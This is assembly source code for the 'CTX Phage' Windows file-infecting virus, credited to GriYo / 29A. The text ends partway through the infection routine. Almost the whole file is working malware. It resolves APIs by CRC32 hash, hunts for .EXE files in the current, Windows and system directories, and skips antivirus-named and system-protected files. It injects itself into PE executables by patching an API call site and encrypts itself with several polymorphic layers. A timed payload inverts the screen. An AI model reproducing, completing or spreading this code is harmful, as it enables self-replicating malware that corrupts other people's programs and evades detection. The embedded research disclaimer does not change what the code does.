   ;----------------------------------------------------------------------------
   ; CTX Phage virus
   ;
   ; BioCoded by GriYo / 29A
   ;
   ; griyo@bi0.net
   ;
   ;----------------------------------------------------------------------------

                   .386P
                   locals
                   jumps
                   .model flat,STDCALL

                   include Win32api.inc
                   include Useful.inc
                   include Mz.inc
                   include Pe.inc

           extrn GetModuleHandleA:NEAR
           extrn ExitProcess:NEAR

   ;----------------------------------------------------------------------------
   ;Fake host used for virus 1st generation
   ;----------------------------------------------------------------------------

   _TEXT           segment dword use32 public 'CODE'

           ;------------------------------------------------------------
           ;We need the CRC lookup table for the next steps
                   ;------------------------------------------------------------

   host_code:  xor ebp,ebp
           call make_crc_tbl

           ;------------------------------------------------------------
           ;Save the CRC32 of 'KERNEL32.DLL' inside virus body
           ;------------------------------------------------------------

           mov esi,offset g1_szKernel32
           call get_str_crc32
           mov dword ptr [CrcKernel32],edx

           ;------------------------------------------------------------
           ;Save the CRC32 of 'GetProcAddress' inside virus body
           ;------------------------------------------------------------

           mov esi,offset g1_szGetProcAddr
           call get_str_crc32
           mov dword ptr [CrcGetProcAddr],edx

           ;------------------------------------------------------------
           ;Get CRC's of needed API's and save them inside virus body
           ;Lets start with KERNEL32 API names
           ;------------------------------------------------------------

           mov ecx,NumK32Apis
           mov esi,offset namesK32Apis
           mov edi,offset CRC32K32Apis
           call save_crc_names

           ;------------------------------------------------------------
           ;Get API used to check for Windows2000 System File Protection
           ;------------------------------------------------------------

           mov ecx,NumSFCApis
           mov esi,offset namesSFCApis
           mov edi,offset CRC32SFCApis
           call save_crc_names

           ;------------------------------------------------------------
           ;Build the do-not-infect-file-by-name CRC32 table
           ;------------------------------------------------------------

           mov ecx,avoid_num
           mov esi,offset g1_avoid_files
           mov edi,offset avoid_tbl
           call save_crc_names

           ;------------------------------------------------------------
           ;Get KERNEL32.DLL module handle
           ;------------------------------------------------------------

           push offset g1_szKernel32
           call GetModuleHandleA
           or eax,eax
           jz out_1st_gen
           mov ebx,eax
           xor ebp,ebp

           db 05h dup (90h)

           call get1st_end

           db 05h dup (90h)

   out_1st_gen:    push 00000000h
           call ExitProcess

   get1st_end: pushad
           xor ebp,ebp
           jmp entry_1st_gen

                   ;------------------------------------------------------------
                   ;Routine that converts API names in CRC32 values
                   ;------------------------------------------------------------

   save_crc_names: cld
   get_g1_crc: push ecx
           lodsd
           push esi
           mov esi,eax
           call get_str_crc32
           mov eax,edx
           stosd
           pop esi
           pop ecx
           loop get_g1_crc
           ret

   _TEXT           ends

   ;----------------------------------------------------------------------------
   ;Here comes the rest of the sections in virus 1st generation
   ;----------------------------------------------------------------------------

   _DATA           segment dword use32 public 'DATA'

                   ;------------------------------------------------------------
                   ;Used to locate KERNEL32 base address on 1st generation
                   ;------------------------------------------------------------

   g1_szKernel32               db 'KERNEL32.DLL',00h
   g1_szGetProcAddr            db 'GetProcAddress',00h

                   ;------------------------------------------------------------
                   ;Do not infect files with this character combinations on its
                   ;name
                   ;------------------------------------------------------------

   g1_avoid_files              equ $

                       dd offset g1_avoid_00
                       dd offset g1_avoid_01
                       dd offset g1_avoid_02
                       dd offset g1_avoid_03
                       dd offset g1_avoid_04
                       dd offset g1_avoid_05
                       dd offset g1_avoid_06
                       dd offset g1_avoid_07
                       dd offset g1_avoid_08

   avoid_num               equ ($-g1_avoid_files)/04h

   g1_avoid_00             db 'DR',00h
   g1_avoid_01             db 'PA',00h
   g1_avoid_02             db 'RO',00h
   g1_avoid_03             db 'VI',00h
   g1_avoid_04             db 'AV',00h
   g1_avoid_05             db 'TO',00h
   g1_avoid_06             db 'CA',00h
   g1_avoid_07             db 'IN',00h
   g1_avoid_08             db 'MS',00h

                   ;------------------------------------------------------------
                   ;KERNEL32.DLL API names
           ;
           ;Note that this tables and strings are not included into the
           ;virus body after 1st generation. Only CRC32 values
                   ;------------------------------------------------------------

   namesK32Apis                equ $

                       dd offset g1_CreateFileA
                       dd offset g1_CreateFileMappingA
                       dd offset g1_CloseHandle
                       dd offset g1_FindClose
                       dd offset g1_FindFirstFileA
                       dd offset g1_FindNextFileA
                       dd offset g1_FreeLibrary
                       dd offset g1_GetCurrentDirectoryA
                       dd offset g1_GetCurrentProcess
                       dd offset g1_GetFileAttributesA
                       dd offset g1_GetLocalTime
                       dd offset g1_GetSystemDirectoryA
                       dd offset g1_GetVersionEx
                       dd offset g1_GetWindowsDirectoryA
                       dd offset g1_LoadLibraryA
                       dd offset g1_MapViewOfFile
                       dd offset g1_SetEndOfFile
                       dd offset g1_SetFileAttributesA
                       dd offset g1_SetFilePointer
                       dd offset g1_SetFileTime
                       dd offset g1_UnmapViewOfFile
                       dd offset g1_VirtualAlloc
                       dd offset g1_WriteProcessMemory

   g1_CreateFileA              db 'CreateFileA',00h
   g1_CreateFileMappingA           db 'CreateFileMappingA',00h
   g1_CloseHandle              db 'CloseHandle',00h
   g1_FindClose                db 'FindClose',00h
   g1_FindFirstFileA           db 'FindFirstFileA',00h
   g1_FindNextFileA            db 'FindNextFileA',00h
   g1_FreeLibrary              db 'FreeLibrary',00h
   g1_GetCurrentDirectoryA         db 'GetCurrentDirectoryA',00h
   g1_GetCurrentProcess            db 'GetCurrentProcess',00h
   g1_GetFileAttributesA           db 'GetFileAttributesA',00h
   g1_GetLocalTime             db 'GetLocalTime',00h
   g1_GetSystemDirectoryA          db 'GetSystemDirectoryA',00h
   g1_LoadLibraryA             db 'LoadLibraryA',00h
   g1_GetVersionEx             db 'GetVersionExA',00h
   g1_GetWindowsDirectoryA         db 'GetWindowsDirectoryA',00h
   g1_MapViewOfFile            db 'MapViewOfFile',00h
   g1_SetEndOfFile             db 'SetEndOfFile',00h
   g1_SetFileAttributesA           db 'SetFileAttributesA',00h
   g1_SetFilePointer           db 'SetFilePointer',00h
   g1_SetFileTime              db 'SetFileTime',00h
   g1_UnmapViewOfFile          db 'UnmapViewOfFile',00h
   g1_VirtualAlloc             db 'VirtualAlloc',00h
   g1_WriteProcessMemory           db 'WriteProcessMemory',00h

                   ;------------------------------------------------------------
                   ;SFC.DLL API names
                   ;------------------------------------------------------------

   namesSFCApis                equ $

                       dd offset g1_SfcIsFileProtected

   g1_SfcIsFileProtected           db 'SfcIsFileProtected',00h

   _DATA           ends

   _BSS            segment dword use32 public 'BSS'

   _BSS            ends

   ;----------------------------------------------------------------------------
   ;Viral section
   ;----------------------------------------------------------------------------

   virseg          segment dword use32 public 'Flu!'

           ;------------------------------------------------------------
           ;Get delta offset in ebp
           ;------------------------------------------------------------

   viro_sys:   call get_delta
   get_delta:  pop ebp
           sub ebp,offset get_delta

           ;------------------------------------------------------------
           ;Make the return address point to the instruction which
           ;made the call
           ;------------------------------------------------------------

           sub dword ptr [esp+cPushad],00000005h

           ;------------------------------------------------------------
           ;Generate a CRC32 lookup table
           ;------------------------------------------------------------

           call make_crc_tbl

           ;------------------------------------------------------------
           ;Check CRC32 of main virus body
           ;
           ; esi -> Ptr to buffer
           ; ecx -> Buffer size
           ;------------------------------------------------------------

           mov ecx,SizeOfProtect
           lea esi,dword ptr [ebp+CRC_protected]
           call get_crc32

           ;------------------------------------------------------------
           ;Checksum matches?
           ;------------------------------------------------------------

           db 0B8h         ; mov eax,imm
   ViralChecksum   dd 00000000h

           cmp eax,edx
           jne critical_error
           jmp KernelScanning

   CRC_protected   equ $

                   ;------------------------------------------------------------
           ;Scan system memory looking for KERNEL32.DLL
                   ;------------------------------------------------------------

   KernelScanning: pushad
   fK32_try_01:    mov eax,080000101h
                   call IGetNtBaseAddr
                   jecxz fK32_try_02
                   jmp short kernel_found
   fK32_try_02:    mov eax,0C0000101h
                   call IGetNtBaseAddr
                   jecxz fK32_try_03
                   jmp short kernel_found
   fK32_try_03:    xor eax,eax
                   call IGetNtBaseAddr
   kernel_found:   jecxz critical_error
           mov dword ptr [esp.Pushad_ebx],ecx
                   popad

                   ;------------------------------------------------------------
                   ;This is the entry-point for 1st generation
           ;Now EBX points to KERNEL32.DLL base address
                   ;------------------------------------------------------------

   entry_1st_gen:  mov dword ptr [ebp+hKERNEL32],ebx

                   ;------------------------------------------------------------
           ;Search for GetProcAddress entry-point
                   ;------------------------------------------------------------

           call GetGetProcAddr
           jecxz critical_error
           mov dword ptr [ebp+a_GetProcAddress],ecx

                   ;------------------------------------------------------------
           ;Get KERNEL32 API addresses
                   ;------------------------------------------------------------

           mov ecx,NumK32Apis
           lea esi,dword ptr [ebp+CRC32K32Apis]
           lea edi,dword ptr [ebp+epK32Apis]
           call get_APIs
           jecxz API_sucksexee

                   ;------------------------------------------------------------
           ;Everything have to work, but if something goes wrong this
           ;will halt the process
                   ;------------------------------------------------------------

   critical_error: jmp critical_error

                   ;------------------------------------------------------------
                   ;Virus ready to infect, but first we need to allocate some
           ;memory for buffers
                   ;------------------------------------------------------------

   API_sucksexee:  push PAGE_EXECUTE_READWRITE
                   push MEM_RESERVE or MEM_COMMIT
                   push alloc_size
                   push 00000000h
                   call dword ptr [ebp+a_VirtualAlloc]
                   or eax,eax
                   jz critical_error

                   ;------------------------------------------------------------
                   ;Copy virus to allocated memory and continue execution there
                   ;------------------------------------------------------------

                   lea esi,dword ptr [ebp+viro_sys]
                   mov edi,eax
                   mov ecx,size_virtual
                   cld
                   rep movsb
           add eax,offset go_mem - offset viro_sys
           push eax
           ret

   ;----------------------------------------------------------------------------
   ;Just a stupid payload
   ;----------------------------------------------------------------------------

   payload:    call GetUser32

           db 'USER32.DLL',00h

   GetUser32:  call dword ptr [ebp+a_LoadLibraryA]
           or eax,eax
           jz ExitPayload
           push eax

           call GetGetDC

           db 'GetDC',00h

   GetGetDC:   push eax
           call dword ptr [ebp+a_GetProcAddress]
           or eax,eax
           jz freeUSER32

           push 00000000h
           call eax
           or eax,eax
           jz freeUSER32

           mov edi,eax

           call GetGDI32

           db 'GDI32.DLL',00h

   GetGDI32:   call dword ptr [ebp+a_LoadLibraryA]
           or eax,eax
           jz freeUSER32
           push eax

           call GetBitBlt

           db 'BitBlt',00h

   GetBitBlt:  push eax
           call dword ptr [ebp+a_GetProcAddress]
           or eax,eax
           jz freeGDI32

           xor ecx,ecx
           push 00550009h  ; Raster operation DSTINVERT
           push ecx        ; Destination Y
           push ecx        ; Destination X
           push edi        ; Destination DC
           push 00000600h  ; Height
           push 00000800h  ; Width
           push ecx        ; Source Y
           push ecx        ; Source X
           push edi        ; Source DC
           call eax

   freeGDI32:  call dword ptr [ebp+a_FreeLibrary]
   freeUSER32: call dword ptr [ebp+a_FreeLibrary]
   ExitPayload:    ret

   ;----------------------------------------------------------------------------
   ;Copyright notice and disclaimer
   ;----------------------------------------------------------------------------

               db '[ '

   copyright       db ' CTX Phage Virus BioCoded by GriYo / 29A '

   disclaimer      db ' Disclaimer: This software has been designed'
               db ' for research purposes only. The author is'
               db ' not responsible for any problems caused due to'
               db ' improper or illegal usage of it '

               db ' ]'

   ;----------------------------------------------------------------------------
   ;End of virus critical initialization
   ;----------------------------------------------------------------------------

                   ;------------------------------------------------------------
           ;Get in-memory delta offset
                   ;------------------------------------------------------------

   go_mem:     call get_mem_delta
   get_mem_delta:  pop ebp
           sub ebp,offset get_mem_delta

                   ;------------------------------------------------------------
           ;Get current local time
                   ;------------------------------------------------------------

           lea esi,dword ptr [ebp+local_time]
           push esi
           call dword ptr [ebp+a_GetLocalTime]

                   ;------------------------------------------------------------
           ;Initialize random number generator seed
                   ;------------------------------------------------------------

           cld
           lodsw
           lodsw
           mov dword ptr [ebp+rnd32_seed],eax

                   ;------------------------------------------------------------
           ;Activate payload now?
                   ;------------------------------------------------------------

           cmp ax,word ptr [ebp+activate_month]
           jne skip_payload
           lodsw
           lodsw
           cmp ax,word ptr [ebp+activate_day]
           jne skip_payload
           lodsw
           cmp ax,word ptr [ebp+activate_hour]
           jne skip_payload

                   ;------------------------------------------------------------
           ;Time to do something funny
                   ;------------------------------------------------------------

           call payload

                   ;------------------------------------------------------------
           ;Set when files infected by the virus will activate
                   ;------------------------------------------------------------

   skip_payload:   mov ax,word ptr [ebp+LT_Month]
           add ax,0006h
           cmp ax,000Ch
           jbe month_is_ok
           sub ax,000Ch
   month_is_ok:    mov word ptr [ebp+activate_month],ax
           mov ax,word ptr [ebp+LT_Day]
           mov word ptr [ebp+activate_day],ax
           mov ax,word ptr [ebp+LT_Hour]
           mov word ptr [ebp+activate_hour],ax

                   ;------------------------------------------------------------
           ;Locate KERNEL32 code section in memory
                   ;------------------------------------------------------------

           call get_code_sh
           mov eax,dword ptr [edi+SH_VirtualAddress]
           add eax,ebx
           mov dword ptr [ebp+K32CodeStart],eax
           add eax,dword ptr [edi+SH_VirtualSize]
           mov dword ptr [ebp+K32CodeEnd],eax

                   ;------------------------------------------------------------
           ;Restore host code
                   ;------------------------------------------------------------

   HostRetry:  mov eax,dword ptr [esp+cPushad]
           push 00000000h
                   push 00000005h
           call get_org_code

   org_code    db 05h dup (90h)

   get_org_code:   push eax
           call dword ptr [ebp+a_GetCurrentProcess]
                   push eax
                   call dword ptr [ebp+a_WriteProcessMemory]

                   ;------------------------------------------------------------
           ;If this fails try again and again...
           ;Any better solution?
                   ;------------------------------------------------------------

           or eax,eax
           jz HostRetry

                   ;------------------------------------------------------------
           ;Check for Windows2000 SFP
                   ;------------------------------------------------------------

           lea esi,dword ptr [ebp+system_version]
           mov dword ptr [esi],00000094h
           push esi
           call dword ptr [ebp+a_GetVersionEx]
           or eax,eax
           jz ErrCore

           cld
           lodsd
           lodsd
           cmp eax,00000005h
           jb NoSFC

                   ;------------------------------------------------------------
           ;Load SFC.DLL
                   ;------------------------------------------------------------

           call GetPtrSFCName

           db 'SFC.DLL',00h

   GetPtrSFCName:  call dword ptr [ebp+a_LoadLibraryA]
           mov dword ptr [ebp+hSFCDLL],eax

           or eax,eax
           jz NoSFC

                   ;------------------------------------------------------------
           ;Find SFC API addresses
                   ;------------------------------------------------------------

           mov ebx,eax
           mov ecx,NumSFCApis
           lea esi,dword ptr [ebp+CRC32SFCApis]
           lea edi,dword ptr [ebp+epSFCApis]
           call get_APIs
           jecxz NoSFC

   FreeSFC:    cmp dword ptr [ebp+hSFCDLL],00000000h
           jz SfcNotLoaded
           push dword ptr [ebp+hSFCDLL]
           call dword ptr [ebp+a_FreeLibrary]
   SfcNotLoaded:   popad
           ret

                   ;------------------------------------------------------------
           ;Infect files before returning to host
                   ;------------------------------------------------------------

   NoSFC:      call search_files

                   ;------------------------------------------------------------
           ;Back to host
                   ;------------------------------------------------------------

   ErrCore:    jmp FreeSFC

   ;----------------------------------------------------------------------------
   ;Find base address of KERNEL32.DLL
   ;Thanks to Jacky Qwerty for the SEH routines
   ;----------------------------------------------------------------------------

   SEH_Block_0000  macro
                   add esp,-cPushad
                   jnz GNtBA_L1
                   endm

   IGetNtBaseAddr: @SEH_SetupFrame <SEH_Block_0000>
                   mov ecx,edx
                   xchg ax,cx
   GNtBA_L0:       dec cx
                   jz GNtBA_L2
                   add eax,-10000h
                   pushad
                   mov bx,-IMAGE_DOS_SIGNATURE
                   add bx,word ptr [eax]
                   mov esi,eax
                   jnz GNtBA_L1
                   mov ebx,-IMAGE_NT_SIGNATURE
                   add eax,dword ptr [esi.MZ_lfanew]
                   mov edx,esi
                   add ebx,dword ptr [eax]
                   jnz GNtBA_L1
                   add edx,[eax.NT_OptionalHeader.OH_DirectoryEntries. \
                            DE_Export.DD_VirtualAddress]
                   add esi,dword ptr [edx.ED_Name]
           lea edi,dword ptr [ebp+BufStrFilename]
           push edi
           call parse_filename
           pop esi
           call get_str_crc32
           cmp edx,dword ptr [ebp+CrcKernel32] ;Is KERNEL32.DLL ?
           je k32_f
   GNtBA_L1:   popad
                   jmp GNtBA_L0

   k32_f:      popad
                   xchg ecx,eax
                   inc eax

   GNtBA_L2:       @SEH_RemoveFrame
                   ret

   ;----------------------------------------------------------------------------
   ;Search for target files in current, windows and system directories
   ;----------------------------------------------------------------------------

                   ;------------------------------------------------------------
           ;Try to infect files in current directory
                   ;------------------------------------------------------------

   search_files:   lea eax,dword ptr [ebp+BufGetDir]
                   push eax
                   push MAX_PATH
                   call dword ptr [ebp+a_GetCurrentDirectoryA]
                   or eax,eax
                   jz try_windir
                   call do_in_dir

                   ;------------------------------------------------------------
           ;Try to infect files in \WINDOWS directory
                   ;------------------------------------------------------------

   try_windir:     push MAX_PATH
                   lea eax,dword ptr [ebp+BufGetDir]
                   push eax
                   call dword ptr [ebp+a_GetWindowsDirectoryA]
                   or eax,eax
                   jz try_sysdir
                   call do_in_dir

                   ;------------------------------------------------------------
           ;Try to infect files in \SYSTEM directory
                   ;------------------------------------------------------------

   try_sysdir:     push MAX_PATH
                   lea eax,dword ptr [ebp+BufGetDir]
                   push eax
                   call dword ptr [ebp+a_GetSystemDirectoryA]
                   or eax,eax
                   jz exit_in_dir

   ;----------------------------------------------------------------------------
   ;Search for files to infect in the specified directory
   ;----------------------------------------------------------------------------

                   ;------------------------------------------------------------
           ;Dont infect files in the root directory
                   ;------------------------------------------------------------

   do_in_dir:  cmp eax,00000004h
                   jb exit_in_dir

   dir_complete:   lea edx,dword ptr [ebp+DirectFindData]
                   push edx
                   lea edi,dword ptr [ebp+BufGetDir]
           push edi

                   ;------------------------------------------------------------
                   ;Insert *.EXE next to path
                   ;------------------------------------------------------------

           xor al,al
                   cld
   direct_Null:    scasb
           jnz direct_Null
           mov byte ptr [edi-00000001h],"\"

                   ;------------------------------------------------------------
           ;This is '*.EXE',00h
                   ;------------------------------------------------------------

           mov eax,'XE.*'
           stosd
           mov ax,0045h
           stosw

                   ;------------------------------------------------------------
           ;Reset number of files infected on this virus execution
                   ;------------------------------------------------------------

           mov byte ptr [ebp+NumInfected],00h

                   ;------------------------------------------------------------
           ;First find try
                   ;------------------------------------------------------------

           call dword ptr [ebp+a_FindFirstFileA]
                   cmp eax,INVALID_HANDLE_VALUE
                   je exit_in_dir
           mov dword ptr [ebp+h_Find],eax

                   ;------------------------------------------------------------
           ;Skip directories, compressed and system files
                   ;------------------------------------------------------------

   work_with_WFD:  mov eax,dword ptr [ebp+                 \
                      DirectFindData+          \
                      WFD_dwFileAttributes]

           and eax,FILE_ATTRIBUTE_DIRECTORY  or            \
               FILE_ATTRIBUTE_COMPRESSED or            \
               FILE_ATTRIBUTE_SYSTEM

           jnz DirectAgain

                   ;------------------------------------------------------------
           ;Check if file size is allowed
                   ;------------------------------------------------------------

           cld
           lea esi,dword ptr [ebp+                 \
                      DirectFindData+          \
                      WFD_nFileSizeHigh]
           lodsd
           or eax,eax
                   jnz DirectAgain
           lodsd
           cmp eax,0FFFFFFFFh-(size_virtual+4000h)
           jae DirectAgain

                   ;------------------------------------------------------------
           ;Check if file is already infected
                   ;------------------------------------------------------------

   SIZE_PADDING    equ 00000065h

                   mov ecx,SIZE_PADDING
                   xor edx,edx
                   div ecx
                   or edx,edx
                   jz DirectAgain

                   ;------------------------------------------------------------
           ;Get complete path+filename and convert it to upper case
                   ;------------------------------------------------------------

           lea esi,dword ptr [ebp+BufGetDir]
           lea edi,dword ptr [ebp+BufStrFilename]
           call parse_filename

           lea esi,dword ptr [ebp+                 \
                      DirectFindData+          \
                      WFD_szFileName]
           mov edi,edx
           call parse_filename

   ;       al  -> Null
   ;       edx -> Points to filename at the end of path
   ;       edi -> Points 1byte above the null terminator

                   ;------------------------------------------------------------
           ;Avoid some files from being infected
                   ;------------------------------------------------------------

           mov esi,edx
   CheckFileName:  push esi
           mov ecx,00000002h
           call get_crc32
           lea esi,dword ptr [ebp+avoid_tbl]
           mov ecx,avoid_num
   AvoidLoop:  lodsd
           cmp eax,edx
           jne NextAvoid

           pop esi
           jmp DirectAgain

   NextAvoid:  loop AvoidLoop
           pop esi
           lodsb
           cmp al,'.'
           jne CheckFileName

                   ;------------------------------------------------------------
           ;Check if file is protected by Window System File Protection
                   ;------------------------------------------------------------

           lea esi,dword ptr [ebp+system_version]
           cld
           lodsd
           lodsd
           cmp eax,00000005h
           jb NotProtected
           cmp dword ptr [ebp+hSFCDLL],00000000h
           jz NotProtected
           lea eax,dword ptr [ebp+BufStrFilename]
           push eax
           push 00000000h
           call dword ptr [ebp+a_SfcIsFileProtected]
           or eax,eax
           jnz DirectAgain

                   ;------------------------------------------------------------
           ;Try to infect this file
                   ;------------------------------------------------------------

   NotProtected:   call infect_file

                   ;------------------------------------------------------------
           ;More files, please
                   ;------------------------------------------------------------

   DirectAgain:    cmp byte ptr [ebp+NumInfected],05h
           jae no_more_pls

           lea eax,dword ptr [ebp+DirectFindData]
           push eax
                   push dword ptr [ebp+h_Find]
           call dword ptr [ebp+a_FindNextFileA]
                   or eax,eax
                   jnz work_with_WFD

                   ;------------------------------------------------------------
           ;Close Win32 find handle
                   ;------------------------------------------------------------
   no_more_pls:

                   push dword ptr [ebp+h_Find]
                   call dword ptr [ebp+a_FindClose]

   exit_in_dir:    ret

   ;----------------------------------------------------------------------------
   ;Infect file routines
   ;
   ;On entry:
   ;       BufStrFilename -> Buffer filled with path + filename
   ;----------------------------------------------------------------------------

   SEH_Block_0001  macro
                   add esp,-cPushad
           jnz Ape_err
                   endm

                   ;------------------------------------------------------------
           ;Open target file... Do not change its size yet, we have
           ;to check first if the file can be infected
                   ;------------------------------------------------------------

   infect_file:    xor edi,edi
           call OpenMapFile
           or eax,eax
           jz inf_file_err

                   ;------------------------------------------------------------
           ;Register ebx contains the base address of the target file
           ;all along infection routines
                   ;------------------------------------------------------------

           mov ebx,eax

                   ;------------------------------------------------------------
                   ;Check for MZ signature at base address
                   ;------------------------------------------------------------

                   cld
                   cmp word ptr [ebx],IMAGE_DOS_SIGNATURE
                   jne inf_close_file

                   ;------------------------------------------------------------
                   ;Check file address of relocation table
                   ;------------------------------------------------------------

                   cmp word ptr [ebx+MZ_lfarlc],0040h
                   jb inf_close_file

                   ;------------------------------------------------------------
                   ;Now go to the pe header and check for the PE signature
                   ;------------------------------------------------------------

                   mov esi,dword ptr [ebx+MZ_lfanew]
                   add esi,ebx
                   lodsd
                   cmp eax,IMAGE_NT_SIGNATURE
                   jne inf_close_file

                   ;------------------------------------------------------------
                   ;Check machine field in IMAGE_FILE_HEADER
                   ;just allow i386 PE files
                   ;------------------------------------------------------------

                   cmp word ptr [esi+FH_Machine],IMAGE_FILE_MACHINE_I386
                   jne inf_close_file

                   ;------------------------------------------------------------
                   ;Now check the characteristics, look if file
                   ;is an executable
                   ;------------------------------------------------------------

                   mov ax,word ptr [esi+FH_Characteristics]
                   test ax,IMAGE_FILE_EXECUTABLE_IMAGE
                   jz inf_close_file

                   ;------------------------------------------------------------
                   ;Avoid DLL's
                   ;------------------------------------------------------------

                   test ax,IMAGE_FILE_DLL
                   jnz inf_close_file

                   ;------------------------------------------------------------
           ;Virus resides on last section
                   ;------------------------------------------------------------

           call get_last_sh
           jecxz inf_close_file

           mov eax,edi
           sub eax,ebx
           mov dword ptr [ebp+virus_sh],eax

                   ;------------------------------------------------------------
           ;Save a pointer to imports
                   ;------------------------------------------------------------

                   mov eax,dword ptr [esi+                 \
                      OH_DataDirectory+            \
                                      DE_Import+               \
                                      DD_VirtualAddress]

           mov dword ptr [ebp+FileImport],eax

                   ;------------------------------------------------------------
           ;Go to relocations
                   ;------------------------------------------------------------

                   mov eax,dword ptr [esi+                 \
                      OH_DataDirectory+            \
                                      DE_BaseReloc+            \
                                      DD_VirtualAddress]
           or eax,eax
           jz cant_overwrite

                   ;------------------------------------------------------------
           ;Relocations sections is the last section?
                   ;------------------------------------------------------------

           sub eax,dword ptr [edi+SH_VirtualAddress]
           jz got_vir_offset

                   ;------------------------------------------------------------
           ;We cant overwrite relocations...
           ;...lets attach the virus to the end of last section
                   ;------------------------------------------------------------

   cant_overwrite: mov eax,dword ptr [edi+SH_SizeOfRawData]
           mov edx,dword ptr [edi+SH_VirtualSize]
           cmp eax,edx
           jae got_vir_offset
           mov eax,edx

   got_vir_offset: add eax,dword ptr [edi+SH_PointerToRawData]
           mov dword ptr [ebp+vir_offset],eax

                   ;------------------------------------------------------------
           ;Search inside host code...
                   ;------------------------------------------------------------

           @SEH_SetupFrame <SEH_Block_0001>
           xor ecx,ecx
           pushad

           call ApeIt
           mov dword ptr [esp+Pushad_ecx],ecx

   Ape_err:    popad
           @SEH_RemoveFrame

           jecxz inf_close_file
           mov dword ptr [ebp+inject_offs],ecx

                   ;------------------------------------------------------------
           ;Close file...
                   ;------------------------------------------------------------

           call UnmapClose
           call HandleClose

                   ;------------------------------------------------------------
           ;...and remap with oversize
                   ;------------------------------------------------------------

           mov edi,00000001h
           call OpenMapFile
           or eax,eax
           jz inf_file_err

           add dword ptr [ebp+virus_sh],eax
           mov ebx,eax

                   ;------------------------------------------------------------
           ;Save original code
                   ;------------------------------------------------------------

           mov esi,dword ptr [ebp+inject_offs]
           add esi,ebx
           lea edi,dword ptr [ebp+org_code]
           cld
           movsb
           movsd

                   ;------------------------------------------------------------
           ;Get CRC32 of main virus body and save it for l8r use
                   ;------------------------------------------------------------

           mov ecx,SizeOfProtect
           lea esi,dword ptr [ebp+CRC_protected]
           call get_crc32
           mov dword ptr [ebp+ViralChecksum],edx

                   ;------------------------------------------------------------
           ;Move virus to file
                   ;------------------------------------------------------------

           lea esi,dword ptr [ebp+viro_sys]
           mov edi,dword ptr [ebp+vir_offset]
           add edi,ebx
           mov ecx,inf_size
           cld
           rep movsb

                   ;------------------------------------------------------------
           ;Initialize size of all decryptors
                   ;------------------------------------------------------------

           mov dword ptr [ebp+decryptor_size],ecx

                   ;------------------------------------------------------------
           ;Save some registers on 1st decryptor
                   ;------------------------------------------------------------

           mov byte ptr [ebp+IsFirst],cl

                   ;------------------------------------------------------------
           ;Generate polymorphic encryption
                   ;------------------------------------------------------------

           mov edx,dword ptr [ebp+vir_offset]

           mov eax,00000004h
           call get_rnd_range
           add eax,00000004h

           mov ecx,eax

   each_layer: push ecx
           cmp ecx,00000001h
           jne Set1stFlag
           mov dword ptr [ebp+IsFirst],0FFh
   Set1stFlag: mov ecx,dword ptr [ebp+decryptor_size]
           add ecx,inf_size
           mov esi,dword ptr [ebp+vir_offset]
           call Mutate
           add dword ptr [ebp+decryptor_size],ecx
           pop ecx
           loop each_layer

                   ;------------------------------------------------------------
           ;Insert a call to virus code over the api call
                   ;------------------------------------------------------------

           mov edi,dword ptr [ebp+inject_offs]
           add edi,ebx
           mov al,0E8h
           stosb
           push edi

                   ;------------------------------------------------------------
           ;Calculate the CALL displacement
                   ;------------------------------------------------------------

           call get_code_sh

           mov eax,dword ptr [esi+OH_FileAlignment]
           mov dword ptr [ebp+raw_align],eax

           mov eax,dword ptr [ebp+inject_offs]
           sub eax,dword ptr [edi+SH_PointerToRawData]
           add eax,dword ptr [edi+SH_VirtualAddress]
           push eax

           mov eax,dword ptr [ebp+entry_point]
           sub eax,00000005h
           sub eax,ebx

           mov edi,dword ptr [ebp+virus_sh]
                   sub eax,dword ptr [edi+SH_PointerToRawData]
                   add eax,dword ptr [edi+SH_VirtualAddress]

           pop edx
           sub eax,edx
           pop edi
           stosd

           mov edi,dword ptr [ebp+virus_sh]

                   ;------------------------------------------------------------
           ;Set read/write access on virus section
                   ;------------------------------------------------------------

           or dword ptr [edi+SH_Characteristics],          \
                    IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE

                   ;------------------------------------------------------------
           ;Dont share virus section
                   ;------------------------------------------------------------

                   and dword ptr [edi+SH_Characteristics],         \
                      not IMAGE_SCN_MEM_SHARED

                   ;------------------------------------------------------------
           ;Update SizeOfRawData
                   ;------------------------------------------------------------

           mov eax,dword ptr [ebp+vir_offset]
           add eax,dword ptr [ebp+decryptor_size]
           add eax,inf_size
           mov edx,dword ptr [edi+SH_PointerToRawData]
           mov dword ptr [ebp+fix_size],edx
           sub eax,edx
           cmp eax,dword ptr [edi+SH_SizeOfRawData]
           jbe RawSizeOk

                   ;------------------------------------------------------------
           ;If we changed SizeOfRawData round up to nearest
           ;file alignment
                   ;------------------------------------------------------------

           xor edx,edx
           mov ecx,dword ptr [ebp+raw_align]
           div ecx
           inc eax
           mul ecx
           mov edx,dword ptr [edi+SH_SizeOfRawData]
           mov dword ptr [edi+SH_SizeOfRawData],eax
           sub eax,edx

           test dword ptr [edi+SH_Characteristics],        \
                   IMAGE_SCN_CNT_INITIALIZED_DATA
           jz RawSizeOk
           add dword ptr [esi+OH_SizeOfInitializedData],eax

                   ;------------------------------------------------------------
           ;Update VirtualSize
                   ;------------------------------------------------------------

   RawSizeOk:  mov eax,dword ptr [edi+SH_SizeOfRawData]
           add dword ptr [ebp+fix_size],eax
           add eax,size_virtual-inf_size
           cmp eax,dword ptr [edi+SH_VirtualSize]
           jbe VirtualSizeOk

           mov dword ptr [edi+SH_VirtualSize],eax

                   ;------------------------------------------------------------
           ;Update SizeOfImage
                   ;------------------------------------------------------------

   VirtualSizeOk:  mov eax,dword ptr [edi+SH_VirtualAddress]
           add eax,dword ptr [edi+SH_VirtualSize]
           xor edx,edx
                   mov ecx,dword ptr [esi+OH_SectionAlignment]
                   div ecx
                   inc eax
                   mul ecx
           mov dword ptr [esi+OH_SizeOfImage],eax

                   ;------------------------------------------------------------
           ;Clear BASE RELOCATION field
                   ;------------------------------------------------------------

           xor eax,eax
                   lea edi,dword ptr [esi+                 \
                      OH_DataDirectory+            \
                      DE_BaseReloc+            \
                                      DD_VirtualAddress]
           stosd
           stosd

                   ;------------------------------------------------------------
           ;Mark file as infected and optimize file size
                   ;------------------------------------------------------------

           call UnmapClose

           xor eax,eax
           push eax            ; dwMoveMethod
           push eax            ; lpDistanceToMoveHigh

           mov eax,dword ptr [ebp+fix_size]
                   mov ecx,SIZE_PADDING
                   xor edx,edx
                   div ecx
                   inc eax
                   mul ecx

           push eax                ; lDistanceToMove

